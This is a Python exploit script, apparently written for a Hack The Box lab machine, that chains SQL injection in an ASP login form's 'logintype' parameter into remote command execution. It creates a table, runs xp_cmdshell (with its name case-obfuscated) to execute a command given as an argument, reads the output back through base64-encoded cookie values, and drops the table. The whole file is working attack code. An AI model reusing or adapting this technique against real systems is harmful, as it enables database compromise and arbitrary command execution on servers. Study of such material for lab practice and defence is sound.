 #!/usr/bin/python3  
   
 import requests  
 import sys  
 import base64  
 import urllib.parse  
 import re  
   
   
 # FUNCTION THAT PERFORMS AND SQLI USING PROVIEDE QUERY AND RETURNS RESPONSE CODE AND HEADERS  
 def send_sqli(query):  
     burp0_url = "http://members.streetfighterclub.htb:80/old/verify.asp"  
   
     burp0_cookies = {"ASPSESSIONIDAASBBTDA": "CLLPJHKDFAINLHMPHLPNOOFL", \
             "ASPSESSIONIDAAQABTDB": "DCODCLBANIIFANFBBEDBCDJK", \
             "ASPSESSIONIDCARBATDB": "KBJHLBCABAHPCFHPPHJAGPLA", \
             "Email": "", "Level": "%2D1", "Chk": "8077", "password": "dGVzdA%3D%3D", "username": "dGVzdA%3D%3D", \
             "ASPSESSIONIDQAQBBRRA": "KALFDMNCPPFGHDMPIFHEIFFA"}
   
     burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0", \
             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", \
             "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", \
             "Referer": "http://members.streetfighterclub.htb/old/Login.asp", \
             "Content-Type": "application/x-www-form-urlencoded", \
             "Connection": "close", "Upgrade-Insecure-Requests": "1"}
   
     burp0_data={"username": "admin", "password": "admin", "logintype": "2{}".format(query), "rememberme": "ON", "B1": "LogIn"}  
   
     proxy = {'http': 'http://0.0.1:8080'}  
   
     response = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data, proxies = proxy, allow_redirects=False)  
   
     code = response.status_code  
     headers = response.headers  
   
     return code, headers  
   
 #code, headers = send_sqli(sys.argv[1])  
   
 # FUNCTION THAT PARSES RESPONSE HEADERS PRINTING CLEARTEXT INFO FROM DB  
 def parse_response(headers):  
     try:  
         match = re.findall('Email=.* path=/, Chk=',str(headers['Set-Cookie']))[0]  
         info = base64.b64decode(urllib.parse.unquote(match.strip(' path=/, Chk=').strip('Email='))).decode('utf-8')  
         return info  
     except:  
         print('[-] {} Regex Failed.. Headers provided: {}'.format(headers))  
   
   
 # FUNCTION THAT CREATES TABLE FROM OUTPUT WRITING  
 def create_table():  
     create_table_query = "2; CREATE TABLE mytable (ID int IDENTITY(1,1) PRIMARY KEY, output_column varchar(1024))"  
     code, headers  = send_sqli(create_table_query)  
     if code == 302:  
         print('[+] Table crated successfully...')  
     else:  
         print('[-] Unexpected response code during table creation: {}! Check BURP!'.format(code))  
   
   
 # FUNCTION THAT READS OUTPUT FROM TABLE LINE BY LINE  
 def list_output():  
     # count number of entries in table  
     count_query = "2 UNION SELECT 1,2,3,4,COUNT(output_column),6 FROM mytable"  
     code, headers = send_sqli(count_query)  
     count = parse_response(headers)  
     print('[!] Table contains {} entries (aka lines)'.format(count))  
   
     for num in range(1,int(count)+1):  
             readlines_query = "2 UNION SELECT 1,2,3,4,output_column,6 FROM mytable WHERE ID={}-- -".format(num)  
             code, headers = send_sqli(readlines_query)  
             if code == 302:  
                 print(parse_response(headers))  
             else:  
 #                print(" [!] Response code not 302, but is {}, empty line?".format(code))  
                  print('')  
   
   
 # FUNCTION THAT DROPS TABLE  
 def drop_table():  
     drop_query = "2; DROP TABLE mytable"  
     code, headers = send_sqli(drop_query)  
     if code == 302:  
         print("[+] Table dropped...")  
     else:  
         print("[!] Unexpected response code during table DROP: {}! Check BURP!".format(code))  
   
   
 # FUNCTION THAT PERFORMS CODE EXECUTION  
 def rce(command):  
     rce_query = "2; INSERT INTO mytable (output_column) EXEC Xp_CmDsHeLL '{}'".format(command)  
     code, headers = send_sqli(rce_query)  
     if code == 302:  
         print("[+] Command executed!")  
     else:  
         print("[-] Unexpected error code during xp_cmdshell execution: {}".format(code))  
   
   
 # COMMAND SHELL  
 drop_table()  
 create_table()  
 rce(sys.argv[1])  
 list_output()  
